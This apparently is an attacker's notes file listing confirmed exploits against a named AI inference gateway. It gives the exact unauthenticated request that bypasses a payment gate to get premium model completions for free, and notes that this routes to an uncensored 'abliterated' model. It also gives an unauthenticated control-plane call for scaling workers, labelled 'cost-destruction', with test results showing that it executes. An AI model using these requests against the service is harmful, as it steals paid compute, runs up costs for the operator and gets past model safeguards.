# Confirmed control/free-AI primitives

- source canon: `holyshit-mode/case-experientiallabs-gateway-dual-surface.md`
- bindings: **WSTG-ATHN** · **CWE-287** · **ATT&CK T1111**
- generated: 2026-11-04

## The technique

### vLLM `/invocations` = keyless free-AI inference (payment-gate bypass)
```
POST https://wm.xplabs.ai/invocations  {"prompt":"...","model":"claude-opus-5","stream":true}
-> 200 SSE completion, NO KEY
```
- Bypasses the `requires_payment` gate on the whole paid catalog; serves premium models
  (`claude-opus-5`, `deepseek-r1`) keylessly. `stream:true` => drop-in OpenAI-compatible.
- **Model substitution confirm:** requested `deepseek-v4-flash`, got served by
  `glm-5.3-flash-abliterated` (uncensored model rides the shared worker).
- `/invocations` takes ANY known catalog slug; not validated against a single lane's set.

### vLLM `/scale_elastic_ep` = unauth control-plane write (cost-destruction)
```
POST /scale_elastic_ep  {"new_data_parallel_size": N}
```
- No auth. `N=0` -> 400 "must be a positive integer" (DoS-to-zero blocked at validation).
- `N=1000` -> 500 "Scale failed" (the endpoint really ATTEMPTED the scale -> proves live
  execution, not a stub). `N=1` -> 200 "Scaled...".
- **Proof-of-execution discriminator:** an error from a *post-validation handler* (500/408)
  vs a *validation error* (400/422) proves the endpoint actually reached the backend op.

## Family use

- decisive-test shape lives in the source canon
- walls: validation-only · NO-GAIN · documented-class adaptation only
